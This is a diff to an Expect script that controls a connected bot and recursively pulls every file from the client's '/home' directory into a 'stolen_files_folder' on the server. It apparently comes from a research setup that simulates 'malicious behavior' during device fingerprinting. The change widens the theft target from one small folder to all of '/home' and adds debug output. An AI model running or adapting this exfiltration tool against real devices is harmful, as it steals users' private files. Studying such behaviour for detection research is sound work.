@@ -15,7 +15,7 @@ expect "$ "
 
 
 # wait until bot has connected
-set timeout 30
+set timeout 35
 expect {
     -re {Bot [0-9]+ \[[^\]]+\] connected from [0-9.]+} {
         puts "\r✅ Bot connected.\r"
@@ -45,6 +45,7 @@ proc traverse {dir stolen_files_folder} {
     	-re {total(.*)\[.*\]} {
 		puts "matched output\n"
 		set output $expect_out(buffer);
+		puts "DEBUG: $expect_out(buffer)"
 	}
     	timeout {
         	puts "\rTimeout occurred\n"
@@ -67,7 +68,7 @@ proc traverse {dir stolen_files_folder} {
         set size [lindex $fields 4]
         set name [lindex $fields end]
         set fullpath "$dir/$name"
-	
+	puts "fullpath: $fullpath"
 	# check if the item is a directory (permissions start with d)
 	# if so recursively traverse folder
         if {[string index $perms 0] eq "d"} {
@@ -81,19 +82,27 @@ proc traverse {dir stolen_files_folder} {
             puts "\r-> Pulling file: $fullpath ($size bytes)\r"
 	    
 	    set save_to $stolen_files_folder$fullpath
+	    puts "save location: $save_to"
             send "pull $fullpath $save_to\r"
 
 	    # set custom timeout length to accustom long waits for file pulling
-	    set timeout [expr {($size / 16) * 600}]
-            expect -re {\[Bot.*\]}
+	    set timeout 1000000 
+            expect {
+		-re {\[Bot.*\]} {
+			puts "DEBUG: $expect_out(buffer)"
+	    }
+		timeout {
+			puts "Timeout"			
+	} }
+
         }
-    }
     
+	}    
     # check if fp is finished
     send "exec cat /home/admin/BA/config/fp_done.flag\r"
     set timeout 3
     expect {
-		"fp finished successfully" {
+		-re {fp finished successfully} {
 			puts "\rfingerprinting finished, stopping malicious behavior\r"
 			exit 0
 		}
@@ -101,13 +110,13 @@ proc traverse {dir stolen_files_folder} {
 			puts "\rfp still running \r"
 		}
 	}
-}
 
+}
 # runs indefinitely, script is stopped when fp has completed on client device
 while {1 > 0} {
  	# the malicious behavior starts stealing data in the '/home' directory
 	# to store the data the folders are mirrored on the server
-	set starting_folder "/home/admin/BA/additional_benign_behavior/venv/lib/python3.11/site-packages/pip/_vendor/certifi"
+	set starting_folder "/home"
 	set first_stolen_folder $stolen_files_folder_location$starting_folder
 	file mkdir $first_stolen_folder
 	
